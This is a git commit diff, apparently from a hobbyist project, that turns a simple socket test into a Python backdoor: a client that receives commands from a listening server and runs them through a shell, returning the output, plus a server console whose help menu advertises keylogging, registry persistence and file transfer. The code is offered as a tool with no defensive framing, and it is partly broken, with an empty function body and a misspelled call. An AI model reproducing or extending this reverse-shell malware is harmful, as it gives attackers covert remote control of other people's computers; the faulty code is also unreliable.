706f1a1e6121232b427188ef661cb6f7248fef8b
msnkr <74895279+msnkr@users.noreply.github.com>
2021-06-16 15:21:01 -0400

    Add files via upload

--- bdoor.py
+++ bdoor.py
@@ -1,6 +1,47 @@
 import socket
+import json
+import subprocess
+import os
 
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.connect(('127.0.0.1', 5555))
-message = 'Hello World'
-sock.send(message.encode())
+
+def send(data):
+    jsondata = json.dumps(data)
+    s.send(jsondata.encode())
+
+
+def receive():
+    data = ''
+    while True:
+        try:
+            data = data + s.recv(1024).decode().rstrip()
+            return json.loads(data)
+        except ValueError:
+            continue
+
+
+def download_file(file_name):
+
+
+def shell():
+    while True:
+        command = receive()
+        if command == 'quit':
+            break
+        elif command == 'help':
+            pass
+        elif command == 'clear':
+            pass
+        elif command[:3] == 'cd ':
+            os.chdir(command[3:])
+        elif command[6:] == 'upload':
+            download_file(command[7:])
+        else:
+            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            result = execute.stdout.read() + execute.stderr.read()
+            result = result.decode()
+            send(result.rstrip())
+
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('127.0.0.1', 5555))
+shell()
--- bdoor_server.py
+++ bdoor_server.py
@@ -1,16 +1,62 @@
 import socket 
 from termcolor import colored
+import json
+import os
+
+
+def receive():
+    data = ''
+    while True:
+        try:
+            data = data + target.recv(1024).decode().rstrip()
+            return json.loads(data)
+        except ValueError:
+            continue
+
+
+def send(data):
+    jsondata = json.dumps(data)
+    target.send(jsondata.encode())
+
+
+def upload_file(file_name):
+    file = opem(file_name, 'rb')
+    target.send(file.read())
+
 
 def target_communication():
-    message = target.recv(1024)
-    print(message.decode())
+    while True:
+        command = input(f'Shell@{ip}: ')
+        send(command)
+        if command == 'quit':
+            break
+        elif command == 'clear':
+            os.system('clear')
+        elif command[:3] == 'cd ':
+            pass
+        elif command[7:] == 'upload':
+            upload_file(command)
+        elif command == 'help':
+            print(colored('''\n
+            quit                                --> Quit Session With The Target
+            clear                               --> Clear The Screen
+            cd *Directory Name*                 --> Changes Directory On Target System
+            upload *file name*                  --> Upload File To The target Machine
+            download *file name*                --> Download File From Target Machine
+            keylog_start                        --> Start The Keylogger
+            keylog_dump                         --> Print Keystrokes That The Target Inputted
+            keylog_stop                         --> Stop And Self Destruct Keylogger File
+            persistence *RegName* *fileName*    --> Create Persistence In Registry\n\n\n''', 'red'))
+        else:
+            result = receive()
+            print(result)
 
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.bind(('127.0.0.1', 5555))
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.bind(('127.0.0.1', 5555))
 print(colored('[0_0] Listening...', 'green'))
-s.listen(5)
+sock.listen(5)
 
-target, ip = s.accept()
+target, ip = sock.accept()
 print(colored(f'[^_^] Connection successful! {ip}!!!', 'blue'))
 target_communication()
